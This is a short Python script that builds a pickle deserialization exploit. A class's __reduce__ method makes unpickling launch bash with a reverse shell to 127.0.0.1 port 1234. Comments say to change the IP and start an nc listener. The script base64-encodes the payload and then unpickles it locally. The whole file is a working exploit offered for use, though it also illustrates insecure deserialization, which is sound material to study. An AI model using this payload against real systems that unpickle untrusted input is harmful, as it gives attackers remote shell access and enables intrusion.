# Note: This connects with a shell to the IP. You need to change the IP and
# make sure you have something listening on port 1234, e.g.:
# nc -v -l -p 1234

# https://blog.nelhage.com/2011/03/exploiting-pickle/
import base64
import pickle
import subprocess
class Exploit(object):
  def __reduce__(self):
    fd = 2 # ←----------------------------------- ???
    return (subprocess.Popen,
            (('/bin/bash', '-c', 'bash >&/dev/tcp/127.0.0.1/1234 0>&1'), # args
             0,            # bufsize
             None,         # executable
             #fd, fd, fd    # std{in,out,err}
             ))

exp = base64.b64encode(pickle.dumps(Exploit()))

print(exp)

p = pickle.loads(base64.b64decode(exp))
print("done", p)
input()

